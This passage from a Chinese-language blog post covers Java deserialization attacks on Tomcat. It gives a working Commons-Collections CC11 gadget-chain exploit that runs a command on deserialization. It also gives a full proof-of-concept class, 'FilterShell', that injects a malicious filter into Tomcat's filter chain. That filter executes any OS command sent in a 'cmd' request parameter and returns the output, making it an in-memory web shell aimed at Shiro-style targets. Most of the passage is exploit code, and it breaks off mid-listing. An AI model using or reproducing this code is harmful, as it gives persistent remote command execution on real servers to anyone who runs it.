class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用javasist动态创建恶意字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc11&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102161904207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102161904207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102161904207"></p><h3 id="反序列化注入"><a href="#反序列化注入" class="headerlink" title="反序列化注入"></a>反序列化注入</h3><p>上文的注入点位于org.apache.catalina.core.ApplicationFilterChain.internalDoFilter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230101130853915"></p><p>但是在set之前执行了doFilter，就执行完了所有的Filter，而shiro反序列化入口rememberMe的功能其实是ShiroFilter的一个模块。所以该方法不能用来打shiro</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230104162826477.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230104162826477.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230104162826477"></p><p>所以为了打shiro这种需要filter的环境，就需要动态注册恶意Filter</p><p>首先创建一个继承AbstractTranslet的类TomcatEchoInject，因为要用到字节码。按照Tomcat回显的步骤，将WRAP_SAME_OBJECT设置为true，并将lastServicedRequest和lastServicedResponse初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//修改static final</span></span><br><span class="line">           setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">           setFinalStatic(lastServicedRequestField);</span><br><span class="line">           setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">           ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">           ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">               WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">               lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">               lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上文jsp版的内存马中，是通过request获取到的servlet上下文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br></pre></td></tr></table></figure><p>这里request存入到了lastServicedRequest，所以可以直接获取servletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>取出request后，通过addFilterMapBefore添加到filter的最前面，这里直接用天下大木头师傅的代码了。</p><p>反射获取filterConfigs，用filterConfigs来启动filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//开始注入内存马</span></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 这样我们就获取到了 context</span></span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//1、创建恶意filter类</span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterShell</span>();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//2、创建一个FilterDef 然后设置filterDef的名字，和类名，以及类</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">//3、将FilterDefs 添加到FilterConfig</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">                filterConfigs.put(<span class="string">&quot;Sentiment&quot;</span>,filterConfig);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//4、创建一个filterMap</span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                <span class="comment">//将自定义的filter放到最前边执行</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                servletResponse.getWriter().write(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//String[] cmds = &#123;&quot;/bin/sh&quot;,&quot;-c&quot;,request.getParameter(&quot;cmd&quot;)&#125;</span></span><br><span class="line">            String[] cmds = &#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">byte</span>[] bcache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readSize</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((readSize = in.read(bcache)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    outputStream.write(bcache, <span class="number">0</span>, readSize);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().println(outputStream.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用无TransformChain的cc2打入字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 